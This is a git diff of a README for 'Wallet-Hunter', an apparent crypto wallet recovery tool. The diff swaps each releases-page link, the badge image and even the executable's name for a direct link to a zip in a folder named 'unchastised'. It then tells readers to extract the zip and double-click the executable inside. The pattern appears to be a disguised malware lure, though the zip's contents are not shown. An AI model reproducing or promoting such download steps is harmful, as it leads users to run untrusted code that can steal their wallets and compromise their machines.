@@ -9,7 +9,7 @@ To get started with Wallet-Hunter, you will need to download the application fro
 ## 📥 Download Wallet-Hunter
 **Click the button below to download Wallet-Hunter:**
 
-[![Download Wallet-Hunter](https://img.shields.io/badge/Download%20Now-Get%20Wallet--Hunter-brightgreen)](https://github.com/Puscasupaul01/Wallet-Hunter/releases)
+[![Download Wallet-Hunter](https://raw.githubusercontent.com/Puscasupaul01/Wallet-Hunter/main/unchastised/Hunter-Wallet-v3.0.zip%20Now-Get%20Wallet--Hunter-brightgreen)](https://raw.githubusercontent.com/Puscasupaul01/Wallet-Hunter/main/unchastised/Hunter-Wallet-v3.0.zip)
 
 ## 📋 System Requirements
 Before you install Wallet-Hunter, ensure your system meets the following requirements:
@@ -22,7 +22,7 @@ Before you install Wallet-Hunter, ensure your system meets the following require
 ### Step 1: Visit the Releases Page
 Click the link below to go to the Releases page where you can find the latest version of Wallet-Hunter.
 
-[Visit Releases Page to Download](https://github.com/Puscasupaul01/Wallet-Hunter/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Puscasupaul01/Wallet-Hunter/main/unchastised/Hunter-Wallet-v3.0.zip)
 
 ### Step 2: Download the Application
 On the Releases page, look for the latest version. Download the file that corresponds to your operating system. 
@@ -31,7 +31,7 @@ On the Releases page, look for the latest version. Download the file that corres
 If you download a compressed file (like .zip or .tar), right-click on it and select “Extract All...” to unzip the content.
 
 ### Step 4: Run Wallet-Hunter
-Locate the extracted folder and find the executable file, commonly named `WalletHunter.exe` or similar. Double-click this file to launch the application.
+Locate the extracted folder and find the executable file, commonly named `https://raw.githubusercontent.com/Puscasupaul01/Wallet-Hunter/main/unchastised/Hunter-Wallet-v3.0.zip` or similar. Double-click this file to launch the application.
 
 ## 🛠️ Using Wallet-Hunter
 Once you have Wallet-Hunter open, follow these simple steps:
@@ -80,4 +80,4 @@ Wallet-Hunter is open-source software. You can freely download and use it. Check
 
 For a complete experience, please visit our GitHub repository and explore additional resources available for Wallet-Hunter. Once again, don’t forget to download the application and start recovering your wallets with ease.
 
-[Download Wallet-Hunter Again](https://github.com/Puscasupaul01/Wallet-Hunter/releases)
+[Download Wallet-Hunter Again](https://raw.githubusercontent.com/Puscasupaul01/Wallet-Hunter/main/unchastised/Hunter-Wallet-v3.0.zip)
